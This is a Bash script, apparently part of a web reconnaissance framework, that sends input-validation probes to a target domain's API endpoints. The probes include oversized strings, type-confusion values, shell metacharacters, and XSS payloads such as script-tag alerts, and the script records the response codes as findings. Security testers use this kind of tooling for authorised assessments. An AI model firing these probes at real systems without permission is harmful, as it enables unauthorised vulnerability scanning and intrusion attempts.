#!/usr/bin/env bash
# input_validation_phase.sh - Input validation boundary testing, max-length bypass,
# type confusion, special character handling.

input_validation_phase() {
    local domain="$1"
    if [[ -z "$domain" ]]; then
        log "ERROR" "input_validation_phase: No domain provided"
        return 1
    fi

    source "$(dirname "$0")/../core/core.sh" 2>/dev/null || true

    local output_dir="$OUTPUT_DIR/$domain/recon_$TIMESTAMP"
    mkdir -p "$output_dir/input_validation"

    local results=0
    local bypass_file="$output_dir/input_validation/validation_bypass.txt"
    local boundary_file="$output_dir/input_validation/boundary_results.txt"

    log "INFO" "Starting input validation testing for $domain"

    tool_available curl || { log "WARN" "curl not found - skipping"; return 0; }

    local endpoints=("/api/login" "/api/search" "/api/users" "/api/data" "/api/upload" "/api/comment" "/api/profile")

    # Boundary value payloads
    local max_strings=(
        ""
        " "
        "a"
        "$(printf 'a%.0s' {1..100})"
        "$(printf 'a%.0s' {1..1000})"
        "$(printf 'a%.0s' {1..10000})"
    )

    # Type confusion payloads
    local type_payloads=(
        "0"
        "-1"
        "99999999999999999999"
        "-99999999999999999999"
        "1.5"
        "NaN"
        "Infinity"
        "-Infinity"
        "null"
        "undefined"
        "true"
        "false"
        "[]"
        "{}"
        "[null]"
        "''"
        "\"\""
    )

    # Special character payloads
    local special_chars=(
        "%00"
        "%0d%0a"
        "%0d"
        "%0a"
        "\\n"
        "\\r"
        "\\t"
        "\\0"
        "%09"
        "%01"
        "%ff"
        "%fe"
        "\\\\"
        "'"
        "\""
        "\`"
        ";"
        "|"
        "&"
        "\$\("
        "\${"
        "<!--"
        "-->"
        "*/"
        "/*"
    )

    # Encoding bypass payloads
    local encoding_payloads=(
        "%27"
        "%22"
        "%3Cscript%3Ealert(1)%3C/script%3E"
        "&lt;script&gt;alert(1)&lt;/script&gt;"
        "javascript:alert(1)"
        "data:text/html,<script>alert(1)</script>"
        "%uff1cscript%uff1ealert(1)%uff1c/script%uff1e"
        "<scr%00ipt>alert(1)</script>"
    )

    for endpoint in "${endpoints[@]}"; do
        local url="https://${domain}${endpoint}"
        log "INFO" "Testing input validation on $url"

        # Test string length boundaries
        for payload in "${max_strings[@]}"; do
            local plen=${#payload}
            local status
            status=$(curl -s -o /dev/null -w "%{http_code}" -m 10 -X POST \
                -d "input=$payload" "$url" 2>/dev/null || echo "000")

            if [[ "$status" != "000" && "$status" != "404" ]]; then
                echo "[MAX-LENGTH] $endpoint - Payload len=$plen -> HTTP $status" >> "$boundary_file"
                ((results++)) || true

                # Check if server echoes back the input (potential XSS)
                local response
                response=$(curl -s -m 10 -X POST -d "input=$payload" "$url" 2>/dev/null || true)
                if [[ -n "$response" && "$plen" -gt 100 ]] && echo "$response" | grep -qF "$payload"; then
                    echo "[ECHO-BACK] $endpoint - Server echoes $plen char input -> potential stored XSS" >> "$bypass_file"
                    ((results++)) || true
                fi
            fi
        done

        # Test type confusion
        for payload in "${type_payloads[@]}"; do
            local status
            status=$(curl -s -o /dev/null -w "%{http_code}" -m 10 -X POST \
                -d "id=$payload" "$url" 2>/dev/null || echo "000")

            if [[ "$status" != "000" && "$status" != "404" && "$status" != "400" ]]; then
                echo "[TYPE-CONFUSION] $endpoint - id=$payload -> HTTP $status" >> "$bypass_file"
                ((results++)) || true
            fi
        done

        # Test special characters
        for char in "${special_chars[@]}"; do
            local encoded_char
            encoded_char=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$char'))" 2>/dev/null || echo "$char")
            local status
            status=$(curl -s -o /dev/null -w "%{http_code}" -m 10 -X POST \
                -d "field=$encoded_char" "$url" 2>/dev/null || echo "000")

            if [[ "$status" == "500" || "$status" == "403" || "$status" == "200" ]]; then
                echo "[SPECIAL-CHAR] $endpoint - char=$char -> HTTP $status" >> "$bypass_file"
                ((results++)) || true
            fi
        done

        # Test encoding bypass
        for payload in "${encoding_payloads[@]}"; do
            local status
            status=$(curl -s -o /dev/null -w "%{http_code}" -m 10 -X POST \
                --data-urlencode "q=$payload" "$url" 2>/dev/null || echo "000")

            if [[ "$status" != "000" && "$status" != "404" && "$status" != "400" ]]; then
                echo "[ENCODING-BYPASS] $endpoint - payload=$payload -> HTTP $status" >> "$bypass_file"
                ((results++)) || true
            fi
        done

        # Test negative numbers and overflow
        local numeric_payloads=(
            "0"
            "-0"
            "0.0"
            "1e308"
            "-1e308"
            "1.7976931348623157e+308"
            "4.94065645841246544e-324"
            "9007199254740993"
        )

        for payload in "${numeric_payloads[@]}"; do
            local status
            status=$(curl -s -o /dev/null -w "%{http_code}" -m 10 -X POST \
                -d "value=$payload" "$url" 2>/dev/null || echo "000")

            if [[ "$status" == "200" || "$status" == "500" ]]; then
                echo "[NUMERIC-OVERFLOW] $endpoint - value=$payload -> HTTP $status" >> "$boundary_file"
                ((results++)) || true
            fi
        done
    done

    # Test GET parameter pollution
    log "INFO" "Testing parameter pollution"
    local poll_url="https://${domain}/api/search"
    local poll_status
    poll_status=$(curl -s -o /dev/null -w "%{http_code}" -m 10 \
        "${poll_url}?q=test&q=admin" 2>/dev/null || echo "000")
    if [[ "$poll_status" != "000" && "$poll_status" != "404" ]]; then
        echo "[PARAM-POLLUTION] $poll_url - Duplicate params -> HTTP $poll_status" >> "$bypass_file"
        ((results++)) || true
    fi

    # Write count
    echo "$results" > "$output_dir/input_validation/count.txt"

    if [[ -f "$(dirname "$0")/../core/phase_bridge.sh" ]]; then
        source "$(dirname "$0")/../core/phase_bridge.sh" 2>/dev/null || true
        while IFS= read -r line; do
            write_finding "input_validation" "MEDIUM" "$line" 2>/dev/null || true
        done < "$bypass_file" 2>/dev/null || true
    fi

    py_log "INFO" "input_validation_phase" "Completed for $domain" "results=$results" 2>/dev/null || true
    log "INFO" "Input validation phase complete: $results findings for $domain"
}

if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    input_validation_phase "$@"
fi
